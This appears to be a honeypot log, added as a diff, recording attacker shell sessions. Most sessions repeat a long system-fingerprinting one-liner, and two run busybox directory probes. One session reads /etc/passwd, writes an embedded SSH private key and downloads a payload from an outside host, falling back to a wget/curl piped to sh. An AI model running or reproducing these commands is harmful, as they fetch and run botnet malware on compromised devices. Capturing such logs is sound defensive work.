@@ -1,0 +1,375 @@
+=== session 3ffcb7608902 | src_ip 2.57.122.XYZ | 2026-08-31T00:05:19.716275Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+[ -f /proc/version ]
+( [ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session f8d6000c6e3f | src_ip 2.57.122.XYZ | 2026-08-31T00:18:18.727938Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session e3d5524c905d | src_ip 2.57.122.XYZ | 2026-08-31T00:39:37.641674Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session 9a96585ab38b | src_ip 92.118.39.XYZ | 2026-08-31T02:09:14.403817Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session 618d914d6266 | src_ip 223.123.73.XYZ | 2026-08-31T04:59:55.861013Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x48\x4e\x51\x41\x56\x4f'
+
+=== session 9c5f6c2228a8 | src_ip 72.255.52.XYZ | 2026-08-31T05:37:46.485755Z ===
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x45\x45\x53\x5a\x41\x45'
+
+=== session 79e4ab804eb1 | src_ip 160.250.93.XYZ | 2026-08-31T05:57:24.681233Z ===
+id
+cat /etc/passwd
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+enable
+system
+shell
+sh
+bash
+cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
+0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
+AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
+Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
+-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
+UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XYZ:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.195.XYZ/sh || curl -sk https://217.60.195.XYZ/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B"
+
+
+=== session 75f5648f3777 | src_ip 2.57.122.XYZ | 2026-08-31T06:53:48.957628Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+( [ -f /proc/version ]
+[ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session c5056502f4df | src_ip 92.118.39.XYZ | 2026-08-31T07:20:25.321715Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+uname -s -v -n -m 2 > /dev/null
+/bin/uname -s -v -n -m 2 > /dev/null
+/usr/bin/uname -s -v -n -m 2 > /dev/null
+busybox uname -s -v -n -m 2 > /dev/null
+[ -f /proc/version ]
+( [ -f /proc/version ]
+head -1 /proc/version | cut -d -f1
+[ -f /etc/os-release ]
+
+=== session eb82ea989a09 | src_ip 92.118.39.XYZ | 2026-08-31T07:24:30.855592Z ===
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 